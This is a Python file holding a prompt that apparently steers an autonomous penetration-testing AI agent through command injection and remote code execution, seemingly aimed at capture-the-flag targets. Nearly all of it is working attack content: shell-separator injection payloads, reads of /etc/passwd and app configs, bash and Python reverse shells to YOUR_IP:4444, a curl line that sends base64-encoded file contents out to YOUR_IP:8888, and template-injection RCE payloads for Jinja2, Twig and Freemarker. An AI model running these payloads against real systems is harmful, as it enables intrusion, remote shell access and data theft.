"""
Command Injection / RCE Attack Skill Prompt.

Concrete mandatory workflow for command injection and RCE.
"""
RCE_SKILL_PROMPT = """
## ATTACK SKILL: COMMAND INJECTION / RCE

**CRITICAL: Target shows signs of command injection or RCE surface.**
**Follow this workflow. Do not switch to SQLi/XSS unless you have proof**
**that the current attack class is wrong.**

---

### DETECTION: Identify command injection surface

A parameter is a CANDIDATE for command injection if:
- It appears to be passed to a system command (ping, nslookup, traceroute, exec, system)
- The response contains output that looks like command output (IP addresses, DNS results)
- The parameter name suggests OS interaction: `cmd`, `exec`, `run`, `command`, `ping`, `host`, `ip`, `file`

### MANDATORY COMMAND INJECTION WORKFLOW

#### STEP 1: DETECTION

For each candidate parameter:
1. Send baseline value — note normal output
2. Append command separators with a harmless command:
   - `; id`
   - `| id`
   - `|| id`
   - `& id` (URL-encode as `%26`)
   - `&& id`
   - `` `id` `` (backtick injection, URL-encode as `%60id%60`)
   - `$(id)` (URL-encode as `%24%28id%29`)
   - Newline injection: `%0aid`

3. If `id` output appears → CONFIRMED command injection.
4. Also test blind: `; sleep 5` — if response delays 5 seconds → CONFIRMED blind.

#### STEP 2: EXPLOITATION

Once confirmed:
1. **Recon**: `; id`, `; uname -a`, `; pwd`, `; ls -la`
2. **Read files**: `; cat /etc/passwd`, `; cat /flag.txt`, `; cat /app/config.py`
3. **Reverse shell** (if allowed):
   ```
   ; bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
   ```
   Or Python reverse shell:
   ```
   ; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
   ```
4. **Data exfil**: `; curl http://YOUR_IP:8888/$(cat /flag.txt | base64)`

#### STEP 3: SSTI (Server-Side Template Injection)

If the parameter reflects user input AND uses template syntax:
- Jinja2: `{{7*7}}` → if 49 appears → CONFIRMED SSTI
- Jinja2 RCE: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
- Twig: `{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}`
- Freemarker: `${7*7}` → if 49 → CONFIRMED. RCE: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`

#### ANTI-PATTERNS:
- Do NOT keep probing the same separator if it failed — try a different one
- Do NOT assume no injection because `; id` didn't work — try `|`, `||`, backticks
- Always test blind (sleep) if output-based injection doesn't show
- Record EVERY probe result with write_note
"""
